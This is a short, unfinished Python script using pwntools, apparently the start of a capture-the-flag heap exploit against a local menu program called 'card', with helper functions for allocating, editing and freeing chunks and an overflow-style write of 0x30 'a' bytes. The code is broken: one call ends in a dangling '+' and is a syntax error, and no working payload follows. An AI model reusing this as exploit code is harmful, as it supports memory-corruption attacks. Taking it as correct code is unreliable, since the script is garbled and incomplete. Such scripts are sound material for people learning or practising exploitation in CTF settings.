from pwn import * 

context.log_level = 'debug'
sh = process('./card')
gdb.attach(sh)

def Write(Until, Text):
    sh.sendlineafter(Until, Text)

def Add(Size):
    Write('Choice:', '1')
    Write('Size: ', str(Size))

def Edit1(idx, Content):
    Write('Choice:', '2')
    Write('Index: ', str(idx))
    sh.sendafter('Message: \n', Content)

def Dele(idx):
    Write('Choice:', '3')
    Write('Index: ', str(idx))

def Edit2(idx, Content):
    Write('Choice:', '5')
    Write('Index: ', str(idx))
    sh.sendafter('Message: \n', Content)  


Add(0x10)
Add(0x400)
Edit1(1, 'a' * 0x30 + )
Add(0x30)


sh.interactive()